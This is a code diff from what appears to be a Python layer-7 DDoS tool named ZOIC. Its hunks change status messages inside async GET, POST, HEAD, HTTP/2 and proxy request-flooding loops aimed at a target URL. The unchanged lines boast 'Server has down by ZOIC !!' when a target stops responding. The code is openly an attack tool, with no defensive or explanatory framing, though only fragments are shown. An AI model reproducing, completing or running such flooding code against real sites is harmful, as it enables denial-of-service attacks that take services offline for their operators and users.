@@ -143,7 +143,7 @@ def layer7():
                 }
                 try:
                     async with session.get(url, headers=headers) as response:
-                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] DDoS Attack !! >> {url}"))
+                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] Url : {url} GET Request : {get_request} Status : {response.status}"))
                 except aiohttp.ClientConnectorError:
                     print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has down by ZOIC !!"))
                     if retries > 0:
@@ -204,7 +204,7 @@ def layer7():
                 }
                 try:
                     async with session.post(url, headers=headers, ) as response:
-                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] DDoS Attack !! >> {url}"))
+                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] Url : {url} POST Request : {post_request} Status : {response.status}"))
                 except aiohttp.ClientConnectorError:
                     print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has down by ZOIC !!"))
                     if retries > 0:
@@ -265,7 +265,7 @@ def layer7():
 
                 try:
                     async with session.head(url, headers=headers,) as response:
-                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] DDoS Attack !! >> {url}"))
+                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] Url : {url} HEAD Request : {head_request} Status : {response.status}"))
                 except aiohttp.ClientConnectorError:
                     print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has down by ZOIC !!"))
                     if retries > 0:
@@ -327,7 +327,7 @@ def layer7():
                     }
                     try:
                         response = await client.get(url, headers=headers)
-                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] DDoS Attack !! >> {url}"))
+                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] Url : {url} HTTP 2.0 Request : {get_request} Status : {response.status_code}"))
                     except aiosonic.exceptions.HttpParsingError:
                         print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has down by ZOIC !!"))
                         if retries > 0:
@@ -398,7 +398,7 @@ def layer7():
                 }
                 try:
                     async with session.get(url, headers=headers) as response:
-                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] DDoS Attack !! with {proxy} >> {url}"))
+                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] PROXY Request : {proxy} => {url} Status : {response.status}"))
                 except aiohttp.ClientConnectorError:
                     print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has down by ZOIC !!"))
                     if retries > 0:
@@ -470,7 +470,7 @@ def layer7():
 
                 try:
                     async with session.get(url, headers=headers) as response:
-                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] DDoS Attack !! >> {url}"))
+                        print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] Url : {url} GET Request : {get_request} Status : {response.status}"))
                 except aiohttp.ClientConnectorError:
                     print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has down by ZOIC !!"))
                     if retries > 0:
@@ -531,7 +531,7 @@ def layer7():
                 }
                 try:
                     async with session.get(url, headers=headers) as response:  
-                          print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] DDoS Attack !! >> {url}"))                                   
+                          print(Colorate.Horizontal(Colors.cyan_to_green, f"[ZOIC] Url : {url} GET Request : {get_request} Status : {response.status}"))                                         
                 except aiohttp.ClientConnectorError:
                     print(Colorate.Horizontal(Colors.red_to_white, f"[-] Server has down by ZOIC !!"))
                     if retries > 0:
